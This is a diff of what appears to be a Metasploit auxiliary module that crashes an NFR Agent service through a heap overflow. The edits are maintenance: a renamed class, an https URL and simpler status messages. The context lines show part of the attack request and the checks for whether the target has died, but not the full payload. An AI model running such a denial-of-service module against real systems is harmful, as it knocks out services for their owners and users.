@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
 
@@ -32,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(3037),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ], self.class)
+      ])
 
   end
 
@@ -45,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
     md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
     message = md5 + record
 
-    print_status("#{peer} - Triggering a heap overflow to cause DoS...")
+    print_status("Triggering a heap overflow to cause DoS...")
 
     begin
     res = send_request_cgi(
@@ -57,16 +54,16 @@ class Metasploit3 < Msf::Auxiliary
         'data'    => message
       })
     rescue ::Errno::ECONNRESET
-      print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
+      print_good("NFR Agent didn't answer, DoS seems successful")
       return
     end
 
     if res
-      print_error("#{peer} - NFR Agent didn't die, it still answers...")
+      print_error("NFR Agent didn't die, it still answers...")
       return
     end
 
-    print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
+    print_good("NFR Agent didn't answer, DoS seems successful")
   end
 end
 
